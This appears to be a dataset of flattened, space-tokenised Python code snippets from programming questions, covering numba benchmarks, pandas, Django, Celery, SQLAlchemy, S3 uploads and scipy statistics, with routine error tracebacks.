"def numpy ( nx , nz , c , rho ) : for ix in range ( 2 , nx-3 ) : for iz in range ( 2 , nz-3 ) : a [ ix , iz ] = sum ( c*rho [ ix-1 : ix+3 , iz ] ) b [ ix , iz ] = sum ( c*rho [ ix-2 : ix+2 , iz ] ) return a , b import numpy as npimport numba as nbimport time @ nb.autojitdef sum_opt ( arr1 , arr2 ) : s = arr1 [ 0 ] *arr2 [ 0 ] for i in range ( 1 , len ( arr1 ) ) : s+=arr1 [ i ] *arr2 [ i ] return sdef numba1 ( nx , nz , c , rho ) : for ix in range ( 2 , nx-3 ) : for iz in range ( 2 , nz-3 ) : a [ ix , iz ] = sum_opt ( c , rho [ ix-1 : ix+3 , iz ] ) b [ ix , iz ] = sum_opt ( c , rho [ ix-2 : ix+2 , iz ] ) return a , b @ nb.autojitdef numba2 ( nx , nz , c , rho ) : for ix in range ( 2 , nx-3 ) : for iz in range ( 2 , nz-3 ) : a [ ix , iz ] = sum_opt ( c , rho [ ix-1 : ix+3 , iz ] ) b [ ix , iz ] = sum_opt ( c , rho [ ix-2 : ix+2 , iz ] ) return a , bnx = 1024nz = 256 rho = np.random.rand ( nx , nz ) c = np.random.rand ( 4 ) a = np.zeros ( ( nx , nz ) ) b = np.zeros ( ( nx , nz ) ) ti = time.clock ( ) a , b = numpy ( nx , nz , c , rho ) print 'Time numpy : ' + ` round ( time.clock ( ) - ti , 4 ) ` ti = time.clock ( ) a , b = numba1 ( nx , nz , c , rho ) print 'Time numba1 : ' + ` round ( time.clock ( ) - ti , 4 ) ` ti = time.clock ( ) a , b = numba2 ( nx , nz , c , rho ) print 'Time numba2 : ' + ` round ( time.clock ( ) - ti , 4 ) ` import numba as nbimport numpy as npfrom scipy import signalimport time @ nb.jit ( [ 'float64 ( float64 [ : ] , float64 [ : ] ) ' ] , nopython=True ) def sum_opt ( arr1 , arr2 ) : s = arr1 [ 0 ] *arr2 [ 0 ] for i in xrange ( 1 , len ( arr1 ) ) : s+=arr1 [ i ] *arr2 [ i ] return s @ nb.autojitdef numba1 ( nx , nz , c , rho , a , b ) : for ix in range ( 2 , nx-3 ) : for iz in range ( 2 , nz-3 ) : a [ ix , iz ] = sum_opt ( c , rho [ ix-1 : ix+3 , iz ] ) b [ ix , iz ] = sum_opt ( c , rho [ ix-2 : ix+2 , iz ] ) return a , b @ nb.jit ( nopython=True ) def numba2 ( nx , nz , c , rho , a , b ) : for ix in range ( 2 , nx-3 ) : for iz in range ( 2 , nz-3 ) : a [ ix , iz ] = sum_opt ( c , rho [ ix-1 : ix+3 , iz ] ) b [ ix , iz ] = sum_opt ( c , rho [ ix-2 : ix+2 , iz ] ) return a , b @ nb.jit ( [ 'float64 [ : , : ] ( int16 , int16 , float64 [ : ] , float64 [ : , : ] , float64 [ : , : ] ) ' ] , nopython=True ) def numba3a ( nx , nz , c , rho , a ) : for ix in range ( 2 , nx-3 ) : for iz in range ( 2 , nz-3 ) : a [ ix , iz ] = sum_opt ( c , rho [ ix-1 : ix+3 , iz ] ) return a @ nb.jit ( [ 'float64 [ : , : ] ( int16 , int16 , float64 [ : ] , float64 [ : , : ] , float64 [ : , : ] ) ' ] , nopython=True ) def numba3b ( nx , nz , c , rho , b ) : for ix in range ( 2 , nx-3 ) : for iz in range ( 2 , nz-3 ) : b [ ix , iz ] = sum_opt ( c , rho [ ix-2 : ix+2 , iz ] ) return bdef convol ( nx , nz , c , aa , bb ) : s1 = rho [ 1 : nx-1,2 : nz-3 ] s2 = rho [ 0 : nx-2,2 : nz-3 ] kernel = c [ : ,None ] [ : :-1 ] aa [ 2 : nx-3,2 : nz-3 ] = signal.convolve2d ( s1 , kernel , boundary='symm ' , mode='valid ' ) bb [ 2 : nx-3,2 : nz-3 ] = signal.convolve2d ( s2 , kernel , boundary='symm ' , mode='valid ' ) return aa , bbnx = 1024nz = 256 rho = np.random.rand ( nx , nz ) c = np.random.rand ( 4 ) a = np.zeros ( ( nx , nz ) ) b = np.zeros ( ( nx , nz ) ) ti = time.clock ( ) for i in range ( 1000 ) : a , b = numba1 ( nx , nz , c , rho , a , b ) print 'Time numba1 : ' + ` round ( time.clock ( ) - ti , 4 ) ` ti = time.clock ( ) for i in range ( 1000 ) : a , b = numba2 ( nx , nz , c , rho , a , b ) print 'Time numba2 : ' + ` round ( time.clock ( ) - ti , 4 ) ` ti = time.clock ( ) for i in range ( 1000 ) : a = numba3a ( nx , nz , c , rho , a ) b = numba3b ( nx , nz , c , rho , b ) print 'Time numba3 : ' + ` round ( time.clock ( ) - ti , 4 ) ` ti = time.clock ( ) for i in range ( 1000 ) : a , b = convol ( nx , nz , c , a , b ) print 'Time convol : ' + ` round ( time.clock ( ) - ti , 4 ) `"
"weather = pd.read_csv ( 'https : //raw.githubusercontent.com/jvns/pandas-cookbook/master/data/weather_2012.csv ' ) weather [ weather.columns [ :4 ] ] .head ( ) Date/Time Temp ( C ) Dew_P Temp ( C ) Rel Hum ( % ) 0 2012-01-01 -1.8 -3.9 861 2012-01-01 -1.8 -3.7 872 2012-01-01 -1.8 -3.4 893 2012-01-01 -1.5 -3.2 884 2012-01-01 -1.5 -3.3 88 for index , dew_point in weather [ 'Dew_P Temp ( C ) ' ] .iteritems ( ) : new = weather [ 'Dew_P Temp ( C ) ' ] [ index ] old = weather [ 'Dew_P Temp ( C ) ' ] [ 0 ] pct_diff = ( new-old ) /old*100 weather [ 'pct_diff ' ] = pct_diff Date/Time Temp ( C ) Dew_P Temp ( C ) Rel Hum ( % ) pct_diff0 2012-01-01 -1.8 -3.9 86 0.00 % 1 2012-01-01 -1.8 -3.7 87 5.12 % 2 2012-01-01 -1.8 -3.4 89 12.82 %"
"class Foo ( models.Model ) : bar = models.CharField ( max_length=300 ) content_type = models.ForeignKey ( ContentType ) object_id = models.PositiveIntegerField ( ) content_object = GenericForeignKey ( 'content_type ' , 'object_id ' ) class FooSerializer ( serializers.ModelSerializer ) : class Meta : model = Fooclass FooViewSet ( viewsets.ModelViewSet ) : model = Foo serializer_class = FooSerializer { bar : 'content ' , content_type : 1 object_id : 5 }"
unable to execute gcc-4.2 : No such file or directory
"# custom_worker.pyimport sysfrom Api.models import *from rq import Queue , Connection , Worker # importing the necessary namespace for the tasks to runfrom tasks import * # dynamically getting the queue names in which I am expecting tasksqueues = [ user.name for user in ApiUser.objects.all ( ) ] with Connection ( ) : qs = list ( map ( Queue , queues ) ) or [ Queue ( ) ] w = Worker ( qs ) w.work ( burst=True )"
"import numpy as npar = np.array ( [ 1 , 2 , 3 , 4 ] ) array ( [ [ 4 , 1 , 2 , 3 ] , [ 3 , 4 , 1 , 2 ] , [ 2 , 3 , 4 , 1 ] , [ 1 , 2 , 3 , 4 ] ] ) ar_roll = np.tile ( ar , ar.shape [ 0 ] ) .reshape ( ar.shape [ 0 ] , ar.shape [ 0 ] ) for indi , ri in enumerate ( ar_roll ) : ar_roll [ indi , : ] = np.roll ( ri , indi + 1 )"
"import numpy as npimport matplotlib.pyplot as plt # Sample study area arrayexample_array = np.array ( [ [ 0 , 0 , 0 , 2 , 2 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 2 , 0 , 2 , 2 , 0 , 6 , 0 , 3 , 3 , 3 ] , [ 0 , 0 , 0 , 0 , 2 , 2 , 0 , 0 , 0 , 3 , 3 , 3 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 3 , 0 , 3 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 3 , 3 ] , [ 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 3 , 3 , 3 , 3 ] , [ 1 , 1 , 1 , 0 , 0 , 0 , 3 , 3 , 3 , 0 , 0 , 3 ] , [ 1 , 1 , 1 , 0 , 0 , 0 , 3 , 3 , 3 , 0 , 0 , 0 ] , [ 1 , 1 , 1 , 0 , 0 , 0 , 3 , 3 , 3 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , [ 1 , 0 , 1 , 0 , 0 , 0 , 0 , 5 , 5 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 4 ] ] ) # Plot arrayplt.imshow ( example_array , cmap= '' spectral '' , interpolation='nearest ' )"
"from django.conf import settingsdef settings_to_dict ( settings ) cfg = { 'BOTO3_ACCESS_KEY ' : settings.BOTO3_ACCESS_KEY , 'BOTO3_SECRET_KEY ' : settings.BOTO3_SECRET_KEY , # repeat ad nauseum } return cfginstance = SomeClassInstantiatedWithADict ( **settings_to_dict ( settings ) ) from django.conf import settingsinstance = SomeClassInstantiatedWithADict ( **settings.to_dict ( ) ) from django.conf import settingsinstance = SomeClassInstantiatedWithADict ( **settings.__dict__ )"
"code_parsing/__init__.pycode_parsing/ada.py from ada import * > > > import code_parsingTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` K : \CODE\pythonlib\code_parsing\__init__.py '' , line 1 , in < module > from ada import *ImportError : No module named ada"
"def finalize_data ( data ) : data = update_statistics ( data ) data.save ( ) from apps.datas.tasks import optimize_data optimize_data.delay ( data.pk ) @ shared_taskdef optimize_data ( data_pk ) : data = Data.objects.get ( pk=data_pk ) # Do something with data optimize_data.apply_async ( ( data.pk , ) , countdown=10 ) optimize_data.delay ( data.pk )"
import datetime as dtdf [ 'year ' ] = df.index.yeardf [ 'month ' ] = df.index.monthdf [ 'day ' ] = df.index.day year month day2016.0 11.0 5.0 year month day2016 11 5
"class AriSBDGmailImap4Client ( imap4.IMAP4Client ) : `` ' client to fetch and process SBD emails from gmail . the messages contained in the emails are sent to the AriSBDStationProtocol for this sbd modem. `` ' def __init__ ( self , contextFactory=None ) : imap4.IMAP4Client.__init__ ( self , contextFactory ) @ defer.inlineCallbacks def serverGreeting ( self , caps ) : # log in try : # the line below no longer works for gmail yield self.login ( mailuser , mailpass ) try : yield self.uponAuthentication ( ) except Exception as e : uponFail ( e , `` uponAuthentication '' ) except Exception as e : uponFail ( e , `` logging in '' ) # done . log out try : yield self.logout ( ) except Exception as e : uponFail ( e , `` logging out '' ) @ defer.inlineCallbacks def uponAuthentication ( self ) : try : yield self.select ( 'Inbox ' ) try : # read messages , etc , etc pass except Exception as e : uponFail ( e , `` searching unread '' ) except Exception as e : uponFail ( e , `` selecting inbox '' ) @ defer.inlineCallbacks def serverGreeting ( self , caps ) : # log in try : # yield self.login ( mailuser , mailpass ) flow = yield threads.deferToThread ( oauth2client.client.flow_from_clientsecrets , filename=CLIENT_SECRET_FILE , scope=OAUTH_SCOPE ) http = httplib2.Http ( ) credentials = yield threads.deferToThread ( STORAGE.get ) if credentials is None or credentials.invalid : parser = argparse.ArgumentParser ( parents= [ oauth2client.tools.argparser ] ) flags = yield threads.deferToThread ( parser.parse_args ) credentials = yield threads.deferToThread ( oauth2client.tools.run_flow , flow=flow , storage=STORAGE , flags=flags , http=http ) http = yield threads.deferToThread ( credentials.authorize , http ) gmail_service = yield threads.deferToThread ( apiclient.discovery.build , serviceName='gmail ' , version='v1 ' , http=http ) self.state = 'auth ' try : yield self.uponAuthentication ( ) except Exception as e : uponFail ( e , `` uponAuthentication '' ) except Exception as e : uponFail ( e , `` logging in '' ) # done . log out try : yield self.logout ( ) except Exception as e : uponFail ( e , `` logging out '' )"
"import shelveimport functoolsdef cache ( filename ) : def decorating_function ( user_function ) : def wrapper ( *args , **kwds ) : key = str ( hash ( functools._make_key ( args , kwds , typed=False ) ) ) with shelve.open ( filename , writeback=True ) as cache : if key in cache : return cache [ key ] else : result = user_function ( *args , **kwds ) cache [ key ] = result return result return functools.update_wrapper ( wrapper , user_function ) return decorating_function @ cache ( filename='cache ' ) def expensive_calculation ( ) : print ( 'inside function ' ) return @ cache ( filename='cache ' ) def other_expensive_calculation ( ) : print ( 'outside function ' ) return expensive_calculation ( ) other_expensive_calculation ( ) $ python3 shelve_test.pyoutside functionTraceback ( most recent call last ) : File `` shelve_test.py '' , line 33 , in < module > other_expensive_calculation ( ) File `` shelve_test.py '' , line 13 , in wrapper result = user_function ( *args , **kwds ) File `` shelve_test.py '' , line 31 , in other_expensive_calculation return expensive_calculation ( ) File `` shelve_test.py '' , line 9 , in wrapper with shelve.open ( filename , writeback=True ) as cache : File `` /usr/local/Cellar/python3/3.4.1/Frameworks/Python.framework/Versions/3.4/lib/python3.4/shelve.py '' , line 239 , in open return DbfilenameShelf ( filename , flag , protocol , writeback ) File `` /usr/local/Cellar/python3/3.4.1/Frameworks/Python.framework/Versions/3.4/lib/python3.4/shelve.py '' , line 223 , in __init__ Shelf.__init__ ( self , dbm.open ( filename , flag ) , protocol , writeback ) File `` /usr/local/Cellar/python3/3.4.1/Frameworks/Python.framework/Versions/3.4/lib/python3.4/dbm/__init__.py '' , line 94 , in open return mod.open ( file , flag , mode ) _gdbm.error : [ Errno 35 ] Resource temporarily unavailable"
"import botoc = boto.connect_s3 ( ) bucket = c.get_bucket ( 'my-bucket ' ) key = boto.s3.key.Key ( bucket , 'my-big-file.gz ' ) signed_url = key.generate_url ( 60 * 60 , 'POST ' ) # expires in an hour import requestsurl = signed_url + ' & uploads'resp = requests.post ( url ) < ? xml version= '' 1.0 '' encoding= '' UTF-8 '' ? > < Error > < Code > SignatureDoesNotMatch < /Code > < Message > The request signature we calculated does not match the signature you provided . Check your key and signing method. < /Message > < StringToSignBytes > ... /StringToSignBytes > < RequestId > ... < /RequestId > < HostId > ... < /HostId > < SignatureProvided > ... < /SignatureProvided > < StringToSign > POST 1402941975 /my-sandbox/test-mp-upload.txt ? uploads < /StringToSign > < AWSAccessKeyId > ... < /AWSAccessKeyId > < /Error >"
"A = [ ' a ' , ' b ' , ' c ' ] B = [ 1 , 2 ] [ ( a,1 ) , ( b,1 ) , ( c,1 ) ] [ ( a,1 ) , ( b,1 ) , ( c,2 ) ] [ ( a,1 ) , ( b,2 ) , ( c,1 ) ] [ ( a,1 ) , ( b,2 ) , ( c,2 ) ] [ ( a,2 ) , ( b,1 ) , ( c,1 ) ] [ ( a,2 ) , ( b,1 ) , ( c,2 ) ] [ ( a,2 ) , ( b,2 ) , ( c,1 ) ] [ ( a,2 ) , ( b,2 ) , ( c,2 ) ] import itertools as itP = it.product ( A , B ) [ p for p in P ] Out [ 3 ] : [ ( ' a ' , 1 ) , ( ' a ' , 2 ) , ( ' b ' , 1 ) , ( ' b ' , 2 ) , ( ' c ' , 1 ) , ( ' c ' , 2 ) ]"
"> python palindrome.py 'Taco cat ! ? ' # ! /usr/bin/env pythonimport sysimport argparseparser = argparse.ArgumentParser ( description='Enter string to see if it\ 's a palindrome . ' ) parser.add_argument ( 'string ' , help= '' string to be tested for palindromedness..ishness '' ) args = parser.parse_args ( ) arg_str = args.string # I can parse by using 'for i in arg_str : ' but if I try to parse 'for i in args : ' # I get TypeError : `` Namespace ' object is not iterable"
"from scipy import sparse , linsolve from scipy import sparse , linsolveImportError : can not import name linsolve"
"d = { ' a':20 , ' b ' : 20 , ' ? ' : 10 } sum = 0for k in d.keys ( ) : if k ! = ' ? ' : sum += d [ k ] print `` This is my sum : `` + sum sum = reduce ( lambda s , k : s if k == ' ? ' else s += d [ k ] , d.keys ( ) )"
> > > help ( Queue.Queue.qsize ) Help on method qsize in module Queue : qsize ( self ) unbound Queue.Queue method Return the approximate size of the queue ( not reliable ! ) . > > >
"> > > def crange ( start , end ) : ... for i in range ( ord ( start ) , ord ( end ) +1 ) : ... yield chr ( i ) ... > > > print ( *crange ( ' a ' , ' e ' ) ) a b c d e > > > crange ( ' a ' , ' e ' ) [ : :2 ] Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : 'generator ' object is not subscriptable > > > ' y ' in crange ( ' a ' , ' z ' ) True > > > class A ( range ) : ... pass ... Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : type 'range ' is not an acceptable base type > > > print ( *dir ( range ) , sep='\n ' ) __class____contains____delattr____dir____doc____eq____format____ge____getattribute____getitem____gt____hash____init____iter____le____len____lt____ne____new____reduce____reduce_ex____repr____reversed____setattr____sizeof____str____subclasshook__countindexstartstepstop"
"def first ( ) : session = DBSession rows = session.query ( Mytable ) .order_by ( Mytable.col1.desc ( ) ) [ :150 ] for i , row in enumerate ( rows ) : time.sleep ( 100 ) print i , row.accessiondef second ( ) : print `` going onto second function '' session = DBSession new_row = session.query ( Anothertable ) .order_by ( Anothertable.col1.desc ( ) ) .first ( ) print 'New Row : ' , new_row.accessionfirst ( ) second ( ) from sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import scoped_session , sessionmakerfrom sqlalchemy import create_engineengine = create_engine ( 'mysql : //blah : blah @ blah/blahblah ' , echo=False , pool_recycle=3600*12 ) DBSession = scoped_session ( sessionmaker ( autocommit=False , autoflush=False , bind=engine ) ) Base = declarative_base ( ) Base.metadata.bind = engine sqlalchemy.exc.OperationalError : ( OperationalError ) ( 2006 , 'MySQL server has gone away ' )"
"from copy import deepcopyclass Node : def __init__ ( self , p_id ) : self.id = p_id self.edge_dict = { } self.degree = 0 def __eq__ ( self , other ) : return self.id == other.id def __hash__ ( self ) : return hash ( self.id ) def add_edge ( self , p_node , p_data ) : if p_node not in self.edge_dict : self.edge_dict [ p_node ] = p_data self.degree += 1 return True else : return Falseif __name__ == '__main__ ' : node1 = Node ( 1 ) node2 = Node ( 2 ) node1.add_edge ( node2 , `` 1- > 2 '' ) node2.add_edge ( node1 , `` 2- > 1 '' ) node1_copy = deepcopy ( node1 ) File `` ... /node_test.py '' , line 15 , in __hash__ return hash ( self.id ) AttributeError : 'Node ' object has no attribute 'id '"
"def _get_parts ( list_of_indices ) : lv = list_of_indices tuples = zip ( lv [ : -1 ] , lv [ 1 : ] ) split_values = [ ] for i in tuples : if i [ 1 ] - i [ 0 ] ! = 1 : split_values.append ( i [ 1 ] ) string = '/'.join ( [ str ( i ) for i in lv ] ) substrings = [ ] for i in split_values : part = string.split ( str ( i ) ) substrings.append ( part [ 0 ] ) string = string.lstrip ( part [ 0 ] ) substrings.append ( string ) result = [ ] for i in substrings : i = i.rstrip ( '/ ' ) result.append ( [ int ( n ) for n in i.split ( '/ ' ) ] ) return result"
"import turtleimport mathturtle.speed ( 0 ) def benoit ( onelen ) : turtle.left ( 90 ) for x in range ( -2*onelen , onelen ) : turtle.up ( ) turtle.goto ( x , int ( -1.5*onelen ) -1 ) turtle.down ( ) for y in range ( int ( -1.5*onelen ) -1 , int ( 1.5*onelen ) -1 ) : z = complex ( 0,0 ) c = complex ( x*1.0/onelen , y*1.0/onelen ) for k in range ( 20 ) : z = z*z+c if abs ( z ) > 2 : g = .2 + .8* ( 20-k ) /20 break if k == 19 : g = 0 turtle.pencolor ( 0 , g,0 ) turtle.forward ( 1 ) benoit ( 250 ) x = raw_input ( `` Press Enter to Exityadayadayada '' )"
"if errorCondition : raise IndexError ( `` index out of range '' ) Traceback ( most recent call last ) : File `` code.py '' , line 261 , in < module > print myCards [ 99 ] File `` Full/Path/To/The/module.py '' , line 37 , in __getitem__ raise IndexError ( `` item index out of range '' ) IndexError : item index out of range"
"$ python2.7 bootstrap.py $ bin/buildout $ bin/py geventecho3.py & [ 1 ] 80790waiting for connection ... $ telnet localhost 8080Trying 127.0.0.1 ... ... connected from : ( '127.0.0.1 ' , 56588 ) Connected to localhost.Escape character is '^ ] '.helloecho : avast $ bin/py threadecho2.py $ bin/py twistedecho2.py"
"> > > a = array ( [ 1,2,3,4,5 ] ) > > > b = array ( [ 2,4,7 ] ) > > > searchsorted ( a , b ) array ( [ 1 , 3 , 5 ] ) > > > a = array ( [ 1,2,3,4,5 ] ) > > > b = array ( [ 2,4,7 ] ) > > > SOMEFUNCTION ( a , b ) array ( [ 1 , 3 ] )"
"import numpy as npfrom scipy.stats import lognormmydata = [ 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,4,4,4,4,4,4,4,4,5,5,5,5,5,6,6,6,6,6,7,7,7,8,8,8,8,8,9,9,9,10,10,11,12,13,14,14,15,19,19,21,23,25,27,28,30,31,36,41,45,48,52,55,60,68,75,86,118,159,207,354 ] shape , loc , scale = lognorm.fit ( mydata ) rnd_log = lognorm.rvs ( shape , loc=loc , scale=scale , size=100 ) import numpy as npfrom scipy.stats import lognormmydata = [ 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,4,4,4,4,4,4,4,4,5,5,5,5,5,6,6,6,6,6,7,7,7,8,8,8,8,8,9,9,9,10,10,11,12,13,14,14,15,19,19,21,23,25,27,28,30,31,36,41,45,48,52,55,60,68,75,86,118,159,207,354 ] mu = np.mean ( [ np.log ( i ) for i in mydata ] ) sigma = np.std ( [ np.log ( i ) for i in mydata ] ) distr = lognorm ( mu , sigma ) rnd_log = distr.rvs ( size=100 ) import pylabpylab.plot ( sorted ( mydata , reverse=True ) , 'ro ' ) pylab.plot ( sorted ( rnd_log , reverse=True ) , 'bx ' ) print 'solution 1 : 'means = [ ] stdes = [ ] distr = lognorm ( mu , sigma ) for _ in xrange ( 1000 ) : rnd_log = distr.rvs ( size=100 ) means.append ( np.mean ( [ np.log ( i ) for i in rnd_log ] ) ) stdes.append ( np.std ( [ np.log ( i ) for i in rnd_log ] ) ) print 'observed mean : ' , mu , 'mean simulated mean : ' , np.mean ( means ) print 'observed std : ' , sigma , 'mean simulated std : ' , np.mean ( stdes ) print '\nsolution 2 : 'means = [ ] stdes = [ ] shape , loc , scale = lognorm.fit ( mydata ) for _ in xrange ( 1000 ) : rnd_log = lognorm.rvs ( shape , loc=loc , scale=scale , size=100 ) means.append ( np.mean ( [ np.log ( i ) for i in rnd_log ] ) ) stdes.append ( np.std ( [ np.log ( i ) for i in rnd_log ] ) ) print 'observed mean : ' , mu , 'mean simulated mean : ' , np.mean ( means ) print 'observed std : ' , sigma , 'mean simulated std : ' , np.mean ( stdes ) solution 1 : observed mean : 1.82562655734 mean simulated mean : 1.18929982267observed std : 1.39003773799 mean simulated std : 0.88985924363solution 2 : observed mean : 1.82562655734 mean simulated mean : 4.50608084668observed std : 1.39003773799 mean simulated std : 5.44206119499 mydata < - c ( 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,4,4,4,4,4,4,4,4,5,5,5,5,5,6,6,6,6,6,7,7,7,8,8,8,8,8,9,9,9,10,10,11,12,13,14,14,15,19,19,21,23,25,27,28,30,31,36,41,45,48,52,55,60,68,75,86,118,159,207,354 ) meanlog < - mean ( log ( mydata ) ) sdlog < - sd ( log ( mydata ) ) means < - c ( ) stdes < - c ( ) for ( i in 1:1000 ) { rnd.log < - rlnorm ( length ( mydata ) , meanlog , sdlog ) means < - c ( means , mean ( log ( rnd.log ) ) ) stdes < - c ( stdes , sd ( log ( rnd.log ) ) ) } print ( paste ( 'observed mean : ' , meanlog , 'mean simulated mean : ' , mean ( means ) , sep= ' ' ) ) print ( paste ( 'observed std : ' , sdlog , 'mean simulated std : ' , mean ( stdes ) , sep= ' ' ) ) [ 1 ] `` observed mean : 1.82562655733507 mean simulated mean : 1.82307191072317 '' [ 1 ] `` observed std : 1.39704049131865 mean simulated std : 1.39736545866904 ''"
"LOG_FILE = ' % s/ % s.log ' % ( LOG_DIR , machine_name ) logging.basicConfig ( filename=LOG_FILE , level=logging.DEBUG , format= ' % ( asctime ) s , % ( msecs ) 05.1f ' ' ( % ( funcName ) s ) % ( message ) s ' , datefmt= ' % H : % M : % S ' )"
"from random import random , randint , choicedef our_decorator ( func ) : def function_wrapper ( *args , **kwargs ) : print ( `` Before calling `` + func.__name__ ) res = func ( *args , **kwargs ) print ( res ) print ( `` After calling `` + func.__name__ ) return function_wrapperfor f in [ random , randint , choice ] : f = our_decorator ( f ) random ( ) randint ( 3 , 8 ) choice ( [ 4 , 5 , 6 ] ) Before calling random < random_value > After calling randomBefore calling randint < random_integer > After calling randintBefore calling choice < random_choice > After calling choice < random_choice among 4,5 6 >"
"< ? xml version= ' 1.0 ' encoding='UTF-8 ' ? > < ! -- top level comment -- > < DCSubtitle/ > root = ET.Element ( `` DCSubtitle '' ) root.addprevious ( ET.Comment ( 'top level comment ' ) ) tree = ET.ElementTree ( root ) tree.write ( sys.stdout , pretty_print=True , xml_declaration=True , encoding='UTF-8 ' )"
"date ui mw maxw tC HL msurp01/03/2004 A 10 10 eC 0.25 0.101/04/2004 A 10 10 eC 0.25 -0.101/03/2004 B 20 20 bC 0.5 0.301/03/2004 B 20 20 bC 0.25 0.3 A,10 , 10 , eC , 0.25 B,20 , 20 , bC , 0.5 B,20 , 20 , bC , 0.5 date ui mw maxw tC HL msurp counter01/03/2004 A 10 10 eC 0.25 0.1 101/04/2004 A 10 10 eC 0.25 -0.1 101/03/2004 B 20 20 bC 0.5 0.3 201/03/2004 B 20 20 bC 0.25 0.3 3"
"import pandas as pds = pd.Series ( [ 1,3,5 , True,6,8 , 'findme ' , False ] ) 1 in sTrue in s 'findme ' in s True in s.str.contains ( 'findme ' ) s2 = s.tolist ( ) 'findme ' in s2"
"import mpmath as mpmx = mpm.arange ( 0,4 ) y = mpm.sin ( x ) # error x = mpm.matrix ( [ 0,1,2,3 ] ) y = mpm.sin ( x ) # error"
"def sliding_window ( run , data , type='mean ' ) : data = data.asfreq ( '30T ' ) for x in date_range ( run.START , run.END , freq='1d ' ) : if int ( datetime.strftime ( x , `` % w '' ) ) == 0 or int ( datetime.strftime ( x , `` % w '' ) ) == 6 : points = data.select ( weekends ) .truncate ( x - relativedelta ( days=run.WINDOW ) , x + relativedelta ( days=run.WINDOW ) ) .groupby ( lambda date : minutes ( date , x ) ) .mean ( ) else : points = data.select ( weekdays ) .truncate ( x - relativedelta ( days=run.WINDOW ) , x + relativedelta ( days=run.WINDOW ) ) .groupby ( lambda date : minutes ( date , x ) ) .mean ( ) for point in points.index : data [ datetime ( x.year , x.month , x.day , point.hour , point.minute ) ] = points [ point ] return data def sliding_window ( run , data , am='mean ' , days='weekdays ' ) : data = data.asfreq ( '30T ' ) data = DataFrame ( { 'Day ' : [ d.date ( ) for d in data.index ] , 'Time ' : [ d.time ( ) for d in data.index ] , 'Weekend ' : [ weekday_string ( d ) for d in data.index ] , 'data ' : data } ) pivot = data.pivot_table ( values='data ' , rows='Day ' , cols= [ 'Weekend ' , 'Time ' ] ) pivot = pivot [ days ] if am == 'median ' : mean = rolling_median ( pivot , run.WINDOW*2 , min_periods=1 ) mean = rolling_mean ( pivot , run.WINDOW*2 , min_periods=1 ) return DataFrame ( { 'mean ' : unpivot ( mean ) , 'amax ' : np.tile ( pivot.max ( ) .values , pivot.shape [ 0 ] ) , 'amin ' : np.tile ( pivot.min ( ) .values , pivot.shape [ 0 ] ) } , index=data.index ) def unpivot ( frame ) : N , K = frame.shape return Series ( frame.values.ravel ( ' C ' ) , index= [ datetime.combine ( d [ 0 ] , d [ 1 ] ) for d in zip ( np.asarray ( frame.index ) .repeat ( K ) , np.tile ( np.asarray ( frame.ix [ 0 ] .index ) , N ) ) ] )"
"import pandas as pdimport numpy as nptable=np.asarray ( [ [ ' $ x^2 $ ',3 ] ] ) df=pd.DataFrame ( table [ : ,1 ] , columns= [ 'value ' ] , index=table [ : ,0 ] ) print ( df.to_latex ( encoding='utf-8 ' ) ) \begin { tabular } { ll } \toprule { } & value \\\midrule\ $ x\textasciicircum2\ $ & 3 \\\bottomrule\end { tabular }"
1 : 2 - 102 : 3 - 153 : 4 - 94 : 8 - 145 : 7 - 136 : 5 - 107 : 11 - 15 1 2 3 4 5 6 7 8 9 10 11 12 13 14 151 | -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- X -- -- -- -- -|2 | -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- X -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- |3 | -- -- -- -- -- -- -- -- -- -- -- -- -- X -- -|4 |-X -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -|5 | -- -- -- -- X -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- |6 | -- -- -- -- -- -- -- -- -- -- X -- -- -- -- -- |7 | -- -- -- -- -- -- -- -- -- -- -- -- -- -|
"l = [ '50 % ' , '12.5 % ' , ' 6.25 % ' , '25 % ' ] [ ' 6.25 % ' , '12.5 % ' , '25 % ' , '50 % ' ] [ '12.5 % ' , '25 % ' , '50 % ' , ' 6.25 % ' ]"
import mod2class Universe : def __init__ ( self ) : pass def answer ( self ) : return 42u = Universe ( ) mod2.show_answer ( u ) # import mod1 -- not necessarydef show_answer ( thing ) : print thing.answer ( )
